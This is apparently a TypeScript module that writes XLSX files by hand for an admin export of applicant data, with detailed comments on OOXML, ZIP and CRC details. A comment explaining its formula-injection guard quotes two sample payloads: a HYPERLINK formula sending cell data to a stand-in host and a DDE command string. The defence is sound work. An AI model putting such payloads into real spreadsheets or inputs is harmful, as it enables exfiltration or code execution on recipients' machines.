import { deflateRawSync } from 'node:zlib';

/**
 * A dependency-free XLSX (SpreadsheetML / OOXML) writer.
 *
 * **Why hand-roll this.** The admin exports a handful of tables — applicants,
 * submissions, impact figures — at a few thousand rows each. Every npm XLSX
 * library is between 400 KB and 7 MB of parser we would never call, shipped
 * into a serverless function that has a cold start to pay, and at least one of
 * them has a history of prototype-pollution advisories. Writing the format is
 * roughly three hundred lines because an `.xlsx` is only a ZIP of six XML
 * parts, and we need exactly one of the six code paths each part supports.
 *
 * The target is "opens in Excel, LibreOffice and Google Sheets with no repair
 * prompt". Excel's repair dialog is not a warning — it is a file the recipient
 * no longer trusts. Everything below that looks over-specified (the `gray125`
 * fill nobody uses, the empty `<border>`, the element order in the worksheet)
 * is there because the schema or Excel's validator insists on it.
 *
 * Deliberately NOT `server-only`: this is a pure function over plain data with
 * no request, no database and no Next runtime, and it is worth a great deal
 * more as something Vitest can execute directly.
 */

export type XlsxCellValue = string | number | boolean | Date | null | undefined;

export type XlsxColumn = {
  /** Header text shown in row 1. */
  header: string;
  /** Approximate column width in characters. Default 18. */
  width?: number;
};

export type XlsxSheet = {
  /** Sheet tab name. Excel forbids : \ / ? * [ ] and caps it at 31 chars — sanitise, don't throw. */
  name: string;
  columns: XlsxColumn[];
  rows: XlsxCellValue[][];
  /** Render the sheet right-to-left. Default true — this is an Arabic-first project. */
  rightToLeft?: boolean;
};

/** Fallback column width, in characters, when a column does not state one. */
const DEFAULT_COLUMN_WIDTH = 18;

/**
 * Indices into the `cellXfs` table written by {@link stylesXml}. The numbers
 * are positions in that list, so the two must be edited together.
 */
const STYLE_DEFAULT = 0;
const STYLE_HEADER = 1;
const STYLE_DATE = 2;
const STYLE_TEXT = 3;

// ─────────────────────────────────────────────────────────────────────────────
// Column letters
// ─────────────────────────────────────────────────────────────────────────────

/**
 * 1-based column index → spreadsheet column letters (1 → `A`, 27 → `AA`,
 * 703 → `AAA`).
 *
 * This is **bijective base-26**, not ordinary base-26: there is no zero digit,
 * so `Z` is followed by `AA` rather than by `BA`. The naive
 * `while (n) { letter(n % 26); n /= 26 }` produces `A@` at 27 because the
 * remainder is 0 and 0 is not a letter. Subtracting one before both the modulo
 * and the division is the whole fix, and it is the single most commonly
 * mis-written line in every spreadsheet writer — a report is correct for
 * twenty-six columns and silently wrong for the twenty-seventh.
 */
export function columnLetter(index: number): string {
  if (!Number.isFinite(index) || index < 1) return 'A';
  let remaining = Math.floor(index);
  let letters = '';
  while (remaining > 0) {
    const digit = (remaining - 1) % 26;
    letters = String.fromCharCode(65 + digit) + letters;
    remaining = Math.floor((remaining - 1) / 26);
  }
  return letters;
}

// ─────────────────────────────────────────────────────────────────────────────
// Text sanitising
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Characters XML 1.0 cannot represent **at all** — not even as a numeric
 * character reference. `&#1;` is not a legal escape; the character simply has
 * no spelling in XML 1.0, so the only correct handling is to drop it.
 *
 * This matters because the values here come from a public form. A pasted CV
 * fragment carrying a stray `\u0000`, or a copy out of a PDF that brought a
 * form-feed with it, would otherwise produce a well-formed-looking file that
 * Excel refuses to open — and the failure would land on the admin exporting
 * the table, weeks later, with nothing pointing at the one applicant who
 * caused it.
 *
 * Tab, LF and CR are legal and are kept. U+FFFE and U+FFFF are permanently
 * unassigned non-characters and are forbidden in content.
 */
const XML_FORBIDDEN = /[\u0000-\u0008\u000B\u000C\u000E-\u001F￾￿]/g;

/**
 * A surrogate code unit without its partner. JavaScript strings are UTF-16 and
 * permit this; UTF-8 has no encoding for it, so `Buffer.from(s, 'utf8')` turns
 * it into U+FFFD and the byte length stops matching what we counted. Removing
 * it here keeps the two in step.
 *
 * Matched (and only matched) when unpaired: a high surrogate not followed by a
 * low one, or a low surrogate not preceded by a high one. A correctly paired
 * surrogate — every emoji, and a good deal of historic script — passes
 * through untouched.
 */
const LONE_SURROGATE = /[\uD800-\uDBFF](?![\uDC00-\uDFFF])|(?<![\uD800-\uDBFF])[\uDC00-\uDFFF]/g;

/**
 * Escapes text for an XML text node or a double-quoted attribute value.
 *
 * `'` is deliberately **not** escaped. `&apos;` is legal, but the formula
 * guard below writes a leading apostrophe as a defence and it has to survive
 * into the file as a literal `'` for Excel to read it as one.
 */
function escapeXml(value: string): string {
  return value
    .replace(XML_FORBIDDEN, '')
    .replace(LONE_SURROGATE, '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

/**
 * The characters Excel reads as "this cell is a formula" when they appear
 * first: `=`, `+`, `-`, `@`, and the two control characters a paste can leave
 * at the front of a value.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

/**
 * **Formula injection defence — read before changing.**
 *
 * Everything in these exports is applicant-supplied. A "name" of
 * `=HYPERLINK("https://evil.example/?"&A2,"Click")` is a string to us and a
 * live formula to Excel: it executes the moment the admin opens the file, with
 * the admin's identity, on the admin's machine. The same trick reaches the
 * shell through `=cmd|'/c calc'!A0` in DDE-enabled installations. This is CWE-1236,
 * and the attacker's entry point is a public form that we are obliged to accept
 * free text into — so the defence cannot live at the input boundary, it has to
 * live here, at the point where the text becomes a spreadsheet.
 *
 * The fix is the one Excel itself uses: a leading apostrophe marks the value as
 * literal text, and the formula is never parsed. The apostrophe is stored in
 * the cell value, and the cell additionally carries the `quotePrefix="1"`
 * style (`STYLE_TEXT`) — that flag is Excel's own record of "this was entered
 * with a leading apostrophe", and it is what keeps the apostrophe from being
 * read as part of the name. Applying it to every text cell, not only the
 * guarded ones, costs one shared style index and means a cell can never be
 * re-interpreted as a number or a date either — a licence number like
 * `2024-0031` stays what it was typed as instead of becoming a subtraction.
 *
 * The known and accepted cost: a string that legitimately begins with `-` or
 * `+` gains a visible apostrophe in the worst case. A visible apostrophe is a
 * cosmetic complaint. An executed formula is an incident.
 */
function guardFormula(value: string): string {
  return FORMULA_LEAD.test(value) ? `'${value}` : value;
}

/**
 * Sheet tab names. Excel forbids `: \ / ? * [ ]`, caps the name at 31
 * characters, rejects a leading or trailing apostrophe (the quoting character
 * in a cross-sheet reference), and rejects an empty name.
 *
 * The contract says **sanitise, don't throw**. A caller building a tab name
 * out of a filter label — a date range with slashes in it, say — should get a
 * usable export, not a 500. Nothing downstream depends on the tab name.
 */
function sanitiseSheetName(name: string, index: number): string {
  const cleaned = name
    .replace(XML_FORBIDDEN, '')
    .replace(LONE_SURROGATE, '')
    .replace(/[:\\/?*[\]]/g, ' ')
    .trim()
    .slice(0, 31)
    .replace(/^'+|'+$/g, '')
    .trim();
  return cleaned.length > 0 ? cleaned : `Sheet${index + 1}`;
}

// ─────────────────────────────────────────────────────────────────────────────
// Dates
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Days from the Unix epoch back to Excel's day zero, 1899-12-30.
 *
 * Not 1899-12-31, which is what the format's own documentation implies. Lotus
 * 1-2-3 believed 1900 was a leap year, Excel copied the bug for file
 * compatibility and has carried it for forty years, so serial 60 is a date
 * that never existed. Shifting the epoch back one day absorbs the phantom
 * 29 February for every date after it, which is every date this application
 * will ever export. Checked against the two values everyone knows:
 * 2000-01-01 is serial 36526 and 1900-03-01 is serial 61.
 */
const EXCEL_EPOCH_OFFSET_DAYS = 25569;

const MS_PER_DAY = 86_400_000;

/**
 * Converts a `Date` to an Excel serial number **in UTC**.
 *
 * Reading the local-time components instead would make the exported file
 * depend on the timezone of the machine that generated it: the same query run
 * from a Vercel function in `hnd1` and from a developer's laptop in Riyadh
 * would disagree by a day for anything near midnight. Every timestamp in this
 * database is `timestamptz`, so UTC is also the honest reading of it.
 */
function excelSerial(date: Date): number {
  return date.getTime() / MS_PER_DAY + EXCEL_EPOCH_OFFSET_DAYS;
}

// ─────────────────────────────────────────────────────────────────────────────
// XML parts
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Every part carries this declaration. `encoding="UTF-8"` is what makes Arabic
 * survive: without it a consumer is entitled to guess, and a guess of Latin-1
 * turns `محمد` into mojibake that no amount of re-opening will recover.
 */
const XML_DECLARATION = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>';

const NS_MAIN = 'http://schemas.openxmlformats.org/spreadsheetml/2006/main';
const NS_REL_DOC = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships';
const NS_REL_PKG = 'http://schemas.openxmlformats.org/package/2006/relationships';
const NS_CONTENT_TYPES = 'http://schemas.openxmlformats.org/package/2006/content-types';

function contentTypesXml(sheetCount: number): string {
  const overrides = Array.from(
    { length: sheetCount },
    (_, i) =>
      `<Override PartName="/xl/worksheets/sheet${i + 1}.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>`,
  ).join('');

  return `${XML_DECLARATION}<Types xmlns="${NS_CONTENT_TYPES}"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>${overrides}<Override PartName="/xl/styles.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.styles+xml"/></Types>`;
}

function rootRelsXml(): string {
  return `${XML_DECLARATION}<Relationships xmlns="${NS_REL_PKG}"><Relationship Id="rId1" Type="${NS_REL_DOC}/officeDocument" Target="xl/workbook.xml"/></Relationships>`;
}

function workbookXml(names: string[]): string {
  const sheets = names
    .map(
      (name, i) =>
        `<sheet name="${escapeXml(name)}" sheetId="${i + 1}" r:id="rId${i + 1}"/>`,
    )
    .join('');

  return `${XML_DECLARATION}<workbook xmlns="${NS_MAIN}" xmlns:r="${NS_REL_DOC}"><sheets>${sheets}</sheets></workbook>`;
}

function workbookRelsXml(sheetCount: number): string {
  const sheetRels = Array.from(
    { length: sheetCount },
    (_, i) =>
      `<Relationship Id="rId${i + 1}" Type="${NS_REL_DOC}/worksheet" Target="worksheets/sheet${i + 1}.xml"/>`,
  ).join('');

  // The styles part takes the relationship id after the last sheet, so adding a
  // sheet moves it. It is generated, never hand-written, which is why that is safe.
  const stylesRel = `<Relationship Id="rId${sheetCount + 1}" Type="${NS_REL_DOC}/styles" Target="styles.xml"/>`;

  return `${XML_DECLARATION}<Relationships xmlns="${NS_REL_PKG}">${sheetRels}${stylesRel}</Relationships>`;
}

/**
 * The smallest style table that does the job.
 *
 * Four things are load-bearing and look like boilerplate:
 *
 * - **Fill 0 must be `none` and fill 1 must be `gray125`.** Excel hard-codes
 *   those two positions. A solid fill placed at index 1 is rendered as the
 *   *next* fill in the list, so the header comes out the wrong colour, and
 *   some builds treat the mismatch as corruption. Our real fill is index 2.
 * - **Border 0 must exist and be empty.** `borders count="0"` is a repair prompt.
 * - **`cellStyleXfs` must exist** even though nothing references it; `cellXfs`
 *   entries point at it through `xfId`.
 * - **`numFmtId` 164** is the first id available to a document. Everything
 *   below 164 is reserved for Excel's built-ins, and redefining one of those
 *   changes how unrelated cells render.
 *
 * `applyNumberFormat` / `applyFont` / `applyFill` are not decoration either: an
 * `xf` that names a format without the matching `apply*` flag is permitted to
 * ignore it, and LibreOffice does.
 */
function stylesXml(): string {
  return (
    `${XML_DECLARATION}<styleSheet xmlns="${NS_MAIN}">` +
    // ISO-ordered and unambiguous in both locales. The backslashes escape the
    // hyphens so no locale reads them as its own date separator.
    `<numFmts count="1"><numFmt numFmtId="164" formatCode="yyyy\\-mm\\-dd"/></numFmts>` +
    `<fonts count="2">` +
    `<font><sz val="11"/><color theme="1"/><name val="Calibri"/><family val="2"/></font>` +
    // Navy ink #14213F — the design system's heading colour, and the one place
    // in this file where the brand shows up at all.
    `<font><b/><sz val="11"/><color rgb="FF14213F"/><name val="Calibri"/><family val="2"/></font>` +
    `</fonts>` +
    `<fills count="3">` +
    `<fill><patternFill patternType="none"/></fill>` +
    `<fill><patternFill patternType="gray125"/></fill>` +
    // Ground #E5E2DA behind the header row.
    `<fill><patternFill patternType="solid"><fgColor rgb="FFE5E2DA"/><bgColor indexed="64"/></patternFill></fill>` +
    `</fills>` +
    `<borders count="1"><border><left/><right/><top/><bottom/><diagonal/></border></borders>` +
    `<cellStyleXfs count="1"><xf numFmtId="0" fontId="0" fillId="0" borderId="0"/></cellStyleXfs>` +
    `<cellXfs count="4">` +
    // 0 — default: numbers, booleans, anything with no opinion.
    `<xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0"/>` +
    // 1 — header: bold navy on ground.
    `<xf numFmtId="0" fontId="1" fillId="2" borderId="0" xfId="0" applyFont="1" applyFill="1"/>` +
    // 2 — date: serial number rendered as yyyy-mm-dd.
    `<xf numFmtId="164" fontId="0" fillId="0" borderId="0" xfId="0" applyNumberFormat="1"/>` +
    // 3 — text: format 49 is the built-in "@" (text), and quotePrefix carries
    // the formula guard. See guardFormula() for why both are here.
    `<xf numFmtId="49" fontId="0" fillId="0" borderId="0" xfId="0" applyNumberFormat="1" quotePrefix="1"/>` +
    `</cellXfs>` +
    `<cellStyles count="1"><cellStyle name="Normal" xfId="0" builtinId="0"/></cellStyles>` +
    `<dxfs count="0"/><tableStyles count="0" defaultTableStyle="TableStyleMedium2"/>` +
    `</styleSheet>`
  );
}

/**
 * One `<c>` element, or the empty string.
 *
 * **Null representation — callers must know this.** `null` and `undefined`
 * emit **no `<c>` element at all**, not an empty one. A sparse row is legal
 * OOXML precisely because each cell carries its own `r="B7"` address, so the
 * reader places the cells it finds and leaves the rest genuinely blank. The
 * distinction is visible to the recipient: a truly absent cell reports
 * `ISBLANK` as true and is skipped by `COUNTA` and by an average, whereas an
 * empty inline string is a value that happens to be zero characters long and
 * is counted. "No data" and "the empty string" are different facts about an
 * applicant and the export should not merge them.
 *
 * Every value is written as an **inline string** (`t="inlineStr"` with
 * `<is><t>`) rather than through a shared-strings table. The table is a small
 * size win on repetitive data and a permanent correctness risk: it is a second
 * structure that indexes into the first, and any bug that lets the two
 * disagree yields a file that opens cleanly with every cell showing the wrong
 * text — the worst possible failure, because it looks fine. At a few thousand
 * rows the saving is irrelevant and the risk is not worth taking. Excel,
 * LibreOffice and Google Sheets all read inline strings natively.
 */
function cellXml(ref: string, value: XlsxCellValue): string {
  if (value === null || value === undefined) return '';

  if (typeof value === 'boolean') {
    return `<c r="${ref}" s="${STYLE_DEFAULT}" t="b"><v>${value ? 1 : 0}</v></c>`;
  }

  if (value instanceof Date) {
    // An Invalid Date serialises to NaN, and `<v>NaN</v>` is a repair prompt.
    // Treating it as absent is the same claim the data makes: no usable date.
    if (Number.isNaN(value.getTime())) return '';
    return `<c r="${ref}" s="${STYLE_DATE}"><v>${excelSerial(value)}</v></c>`;
  }

  if (typeof value === 'number') {
    // NaN and ±Infinity have no `<v>` spelling. They fall through to the text
    // path, where they become the literal words — which is at least true, and
    // is a visible prompt to fix whatever produced them upstream.
    if (Number.isFinite(value)) {
      return `<c r="${ref}" s="${STYLE_DEFAULT}"><v>${value}</v></c>`;
    }
  }

  const text = escapeXml(guardFormula(String(value)));
  // xml:space="preserve" because a leading or trailing space in a name is data
  // — it is evidence of how the form was filled in — and XML would otherwise
  // let a reader collapse it away.
  return `<c r="${ref}" s="${STYLE_TEXT}" t="inlineStr"><is><t xml:space="preserve">${text}</t></is></c>`;
}

/**
 * A worksheet part.
 *
 * **Element order is fixed by the schema** — `dimension`, `sheetViews`,
 * `sheetFormatPr`, `cols`, `sheetData`, then `autoFilter` — and a sequence
 * validator, which is what Excel runs, rejects the file rather than reordering
 * it. In particular `autoFilter` comes *after* `sheetData`, which reads
 * backwards and is the usual mistake.
 */
function sheetXml(sheet: XlsxSheet): string {
  const columns = sheet.columns;
  // A row wider than the header list still has to fit inside the declared
  // dimension, or Excel drops the overflow. Folded rather than spread into
  // `Math.max(...lengths)`: the spread pushes one argument per row onto the
  // stack, and a hundred-thousand-row export would die with a stack overflow
  // in a function that is only counting columns.
  const columnCount = sheet.rows.reduce(
    (widest, row) => Math.max(widest, row.length),
    Math.max(columns.length, 1),
  );
  const rowCount = sheet.rows.length + 1; // +1 for the header row.
  const lastRef = `${columnLetter(columnCount)}${rowCount}`;

  const headerCells = Array.from({ length: columnCount }, (_, i) => {
    const ref = `${columnLetter(i + 1)}1`;
    const header = columns[i]?.header ?? '';
    return `<c r="${ref}" s="${STYLE_HEADER}" t="inlineStr"><is><t xml:space="preserve">${escapeXml(guardFormula(header))}</t></is></c>`;
  }).join('');

  const bodyRows = sheet.rows
    .map((row, r) => {
      const rowNumber = r + 2; // Row 1 is the header.
      const cells = row
        .map((value, c) => cellXml(`${columnLetter(c + 1)}${rowNumber}`, value))
        .join('');
      // `spans` is a hint, not a constraint; it lets a reader size its buffers
      // before parsing the row. Cheap to emit, and Excel writes it too.
      return `<row r="${rowNumber}" spans="1:${columnCount}">${cells}</row>`;
    })
    .join('');

  // `<cols>` must not be empty — a childless element fails the schema — so it
  // is omitted entirely when there is nothing to declare.
  const cols =
    columns.length > 0
      ? `<cols>${columns
          .map(
            (column, i) =>
              `<col min="${i + 1}" max="${i + 1}" width="${column.width ?? DEFAULT_COLUMN_WIDTH}" customWidth="1"/>`,
          )
          .join('')}</cols>`
      : '';

  // Default true: this project's exports are read in Arabic, and an RTL sheet
  // is the primary drawing rather than a mirror of an LTR one.
  const rtl = sheet.rightToLeft !== false ? ' rightToLeft="1"' : '';

  // The frozen pane keeps the header visible while scrolling a thousand rows —
  // without it the twentieth column of the four-hundredth row is unreadable.
  // The autofilter is what makes the export a working tool rather than a dump.
  const pane =
    `<pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>` +
    `<selection pane="bottomLeft" activeCell="A2" sqref="A2"/>`;

  return (
    `${XML_DECLARATION}<worksheet xmlns="${NS_MAIN}" xmlns:r="${NS_REL_DOC}">` +
    `<dimension ref="A1:${lastRef}"/>` +
    `<sheetViews><sheetView${rtl} tabSelected="1" workbookViewId="0">${pane}</sheetView></sheetViews>` +
    `<sheetFormatPr defaultRowHeight="15"/>` +
    cols +
    `<sheetData><row r="1" spans="1:${columnCount}">${headerCells}</row>${bodyRows}</sheetData>` +
    `<autoFilter ref="A1:${lastRef}"/>` +
    `</worksheet>`
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// ZIP container
// ─────────────────────────────────────────────────────────────────────────────

/**
 * CRC-32 (IEEE 802.3, reflected polynomial 0xEDB88320) — the checksum the ZIP
 * format requires on every entry.
 *
 * Built once, lazily, and reused. A wrong CRC is the single most common way a
 * hand-built ZIP fails: the archive looks structurally perfect, every offset
 * resolves, and the consumer refuses it as corrupt with no indication of which
 * entry is at fault.
 */
let crcTable: Int32Array | null = null;

function crc32(buffer: Buffer): number {
  if (crcTable === null) {
    const table = new Int32Array(256);
    for (let n = 0; n < 256; n += 1) {
      let c = n;
      for (let k = 0; k < 8; k += 1) {
        c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
      }
      table[n] = c;
    }
    crcTable = table;
  }

  const table = crcTable;
  let crc = -1;
  for (let i = 0; i < buffer.length; i += 1) {
    // `?? 0` satisfies noUncheckedIndexedAccess. Neither read can actually miss
    // — `i` is bounded by the length and the table index is masked to 8 bits —
    // but a non-null assertion here would be an unchecked claim in the one loop
    // whose output nothing downstream can sanity-check.
    const byte = buffer[i] ?? 0;
    crc = (table[(crc ^ byte) & 0xff] ?? 0) ^ (crc >>> 8);
  }
  // `>>> 0` because the accumulator is signed 32-bit and the field is unsigned.
  return (crc ^ -1) >>> 0;
}

/**
 * A fixed DOS timestamp: 1980-01-01 00:00:00, the earliest the format can
 * express.
 *
 * **This is what makes the output byte-deterministic**, and determinism is
 * what makes the unit test meaningful — `expect(buildXlsx(x)).toEqual(buildXlsx(x))`
 * is a real assertion only if nothing in the pipeline reads the clock. It also
 * means a caching layer can hash the bytes, and a regression shows up as a
 * diff rather than as two files that differ in a way nobody can attribute.
 *
 * The cost is that Explorer shows every entry as dating from 1980. Nothing
 * reads it; Excel certainly does not.
 */
const DOS_DATE = 0x0021; // year 1980, month 1, day 1
const DOS_TIME = 0x0000; // 00:00:00

type ZipEntry = {
  name: string;
  source: Buffer;
  deflated: Buffer;
  crc: number;
};

/**
 * Builds the ZIP container by hand: a local file header plus data for each
 * entry, then the central directory, then the end-of-central-directory record.
 *
 * Everything is stored with method 8 (raw DEFLATE) because that is what
 * `deflateRawSync` produces — "raw" means no zlib two-byte header and no
 * trailing Adler-32, which is exactly the ZIP framing. Passing `deflateSync`
 * output here instead is a subtle and complete failure: the extra six bytes
 * shift every offset a reader computes.
 *
 * No ZIP64. It would only be needed past 4 GB or 65,535 entries, and an export
 * that large is a problem to solve upstream rather than a format to support.
 */
function zip(entries: Array<{ name: string; content: string }>): Buffer {
  const prepared: ZipEntry[] = entries.map(({ name, content }) => {
    const source = Buffer.from(content, 'utf8');
    return { name, source, deflated: deflateRawSync(source), crc: crc32(source) };
  });

  const locals: Buffer[] = [];
  const centrals: Buffer[] = [];
  let offset = 0;

  for (const entry of prepared) {
    const nameBytes = Buffer.from(entry.name, 'utf8');

    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0); // local file header signature
    local.writeUInt16LE(20, 4); // version needed to extract (2.0 = deflate)
    // General purpose flag bit 11 marks the filename as UTF-8. Our names are
    // ASCII, so it changes nothing today; it is set so that it stays correct if
    // one ever is not.
    local.writeUInt16LE(0x0800, 6);
    local.writeUInt16LE(8, 8); // method: deflate
    local.writeUInt16LE(DOS_TIME, 10);
    local.writeUInt16LE(DOS_DATE, 12);
    local.writeUInt32LE(entry.crc, 14);
    local.writeUInt32LE(entry.deflated.length, 18);
    local.writeUInt32LE(entry.source.length, 22);
    local.writeUInt16LE(nameBytes.length, 26);
    local.writeUInt16LE(0, 28); // extra field length

    locals.push(local, nameBytes, entry.deflated);

    const central = Buffer.alloc(46);
    central.writeUInt32LE(0x02014b50, 0); // central directory header signature
    central.writeUInt16LE(20, 4); // version made by
    central.writeUInt16LE(20, 6); // version needed to extract
    central.writeUInt16LE(0x0800, 8);
    central.writeUInt16LE(8, 10);
    central.writeUInt16LE(DOS_TIME, 12);
    central.writeUInt16LE(DOS_DATE, 14);
    central.writeUInt32LE(entry.crc, 16);
    central.writeUInt32LE(entry.deflated.length, 20);
    central.writeUInt32LE(entry.source.length, 24);
    central.writeUInt16LE(nameBytes.length, 28);
    central.writeUInt16LE(0, 30); // extra field length
    central.writeUInt16LE(0, 32); // file comment length
    central.writeUInt16LE(0, 34); // disk number start
    central.writeUInt16LE(0, 36); // internal file attributes
    central.writeUInt32LE(0, 38); // external file attributes
    // The offset of this entry's *local* header. This is the field a reader
    // seeks to, so it must be the running total of everything written before
    // the header — not after it, and not the offset of the data.
    central.writeUInt32LE(offset, 42);

    centrals.push(central, nameBytes);

    offset += local.length + nameBytes.length + entry.deflated.length;
  }

  const centralDirectory = Buffer.concat(centrals);

  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0); // end of central directory signature
  eocd.writeUInt16LE(0, 4); // number of this disk
  eocd.writeUInt16LE(0, 6); // disk where the central directory starts
  eocd.writeUInt16LE(prepared.length, 8); // entries on this disk
  eocd.writeUInt16LE(prepared.length, 10); // entries in total
  eocd.writeUInt32LE(centralDirectory.length, 12);
  eocd.writeUInt32LE(offset, 16); // central directory offset = end of the local section
  eocd.writeUInt16LE(0, 20); // comment length

  return Buffer.concat([...locals, centralDirectory, eocd]);
}

// ─────────────────────────────────────────────────────────────────────────────
// Entry point
// ─────────────────────────────────────────────────────────────────────────────

/**
 * Builds a complete `.xlsx` workbook.
 *
 * Pure and synchronous: the same input always yields byte-identical output.
 * Nothing here reads the clock, the filesystem, the environment or a random
 * source, so the result can be hashed, cached and diffed.
 */
export function buildXlsx(sheets: XlsxSheet[]): Buffer {
  // A workbook with no sheet is not a valid file — Excel refuses it — so an
  // empty argument yields an empty single sheet rather than an unopenable
  // download. An export of a filter that matched nothing is a real thing for a
  // user to do, and it should produce a file that says so.
  const input: XlsxSheet[] =
    sheets.length > 0 ? sheets : [{ name: 'Sheet1', columns: [], rows: [] }];

  // Excel rejects a workbook with two identically-named tabs, and two callers
  // deriving a tab name from the same label is an easy accident. Deduplicate
  // with a numeric suffix, keeping the result inside the 31-character cap.
  const used = new Set<string>();
  const names = input.map((sheet, i) => {
    const base = sanitiseSheetName(sheet.name, i);
    let candidate = base;
    let suffix = 2;
    while (used.has(candidate.toLowerCase())) {
      const tail = ` (${suffix})`;
      candidate = `${base.slice(0, 31 - tail.length)}${tail}`;
      suffix += 1;
    }
    used.add(candidate.toLowerCase());
    return candidate;
  });

  return zip([
    { name: '[Content_Types].xml', content: contentTypesXml(input.length) },
    { name: '_rels/.rels', content: rootRelsXml() },
    { name: 'xl/workbook.xml', content: workbookXml(names) },
    { name: 'xl/_rels/workbook.xml.rels', content: workbookRelsXml(input.length) },
    { name: 'xl/styles.xml', content: stylesXml() },
    ...input.map((sheet, i) => ({
      name: `xl/worksheets/sheet${i + 1}.xml`,
      content: sheetXml(sheet),
    })),
  ]);
}
